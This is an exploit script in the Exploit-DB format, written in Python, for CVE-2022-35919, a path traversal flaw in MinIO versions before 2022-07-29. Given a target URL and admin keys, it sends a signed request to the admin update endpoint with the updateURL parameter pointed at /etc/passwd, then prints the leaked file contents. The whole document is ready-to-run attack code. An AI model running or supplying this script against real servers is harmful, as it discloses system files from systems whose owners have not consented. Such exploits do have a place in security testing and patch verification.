# Exploit Title: Minio 2022-07-29T19-40-48Z - Path traversal
# Date: 2023-09-02
# Exploit Author: Jenson Zhao
# Vendor Homepage: https://min.io/
# Software Link: https://github.com/minio/minio/
# Version: Up to (excluding) 2022-07-29T19-40-48Z
# Tested on: Windows 10
# CVE : CVE-2022-35919
# Required before execution: pip install minio,requests
import urllib.parse
import requests, json, re, datetime, argparse
from minio.credentials import Credentials
from minio.signer import sign_v4_s3


class MyMinio():
    secure = False

    def __init__(self, base_url, access_key, secret_key):
        self.credits = Credentials(
            access_key=access_key,
            secret_key=secret_key
        )
        if base_url.startswith('http://') and base_url.endswith('/'):
            self.url = base_url + 'minio/admin/v3/update?updateURL=%2Fetc%2Fpasswd'
        elif base_url.startswith('https://') and base_url.endswith('/'):
            self.url = base_url + 'minio/admin/v3/update?updateURL=%2Fetc%2Fpasswd'
            self.secure = True
        else:
            print('Please enter a URL address that starts with "http://" or "https://" and ends with "/"\n')

    def poc(self):
        datetimes = datetime.datetime.utcnow()
        datetime_str = datetimes.strftime('%Y%m%dT%H%M%SZ')
        urls = urllib.parse.urlparse(self.url)
        headers = {
            'X-Amz-Content-Sha256': 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
            'X-Amz-Date': datetime_str,
            'Host': urls.netloc,
        }
        headers = sign_v4_s3(
            method='POST',
            url=urls,
            region='',
            headers=headers,
            credentials=self.credits,
            content_sha256='e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
            date=datetimes,
        )
        if self.secure:
            response = requests.post(url=self.url, headers=headers, verify=False)
        else:
            response = requests.post(url=self.url, headers=headers)
        try:
            message = json.loads(response.text)['Message']
            pattern = r'(\w+):(\w+):(\d+):(\d+):(\w+):(\/[\w\/\.-]+):(\/[\w\/\.-]+)'
            matches = re.findall(pattern, message)
            if matches:
                print('There is CVE-2022-35919 problem with the url!')
                print('The contents of the /etc/passwd file are as follows:')
                for match in matches:
                    print("{}:{}:{}:{}:{}:{}:{}".format(match[0], match[1], match[2], match[3], match[4], match[5],
                                                        match[6]))
            else:
                print('There is no CVE-2022-35919 problem with the url!')
                print('Here is the response message content:')
                print(message)
        except Exception as e:
            print(
                'It seems there was an issue with the requested response, which did not meet our expected criteria. Here is the response content:')
            print(response.text)


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", required=True, help="URL of the target. example: http://192.168.1.1:9088/")
    parser.add_argument("-a", "--accesskey", required=True, help="Minio AccessKey of the target. example: minioadmin")
    parser.add_argument("-s", "--secretkey", required=True, help="Minio SecretKey of the target. example: minioadmin")
    args = parser.parse_args()
    minio = MyMinio(args.url, args.accesskey, args.secretkey)
    minio.poc()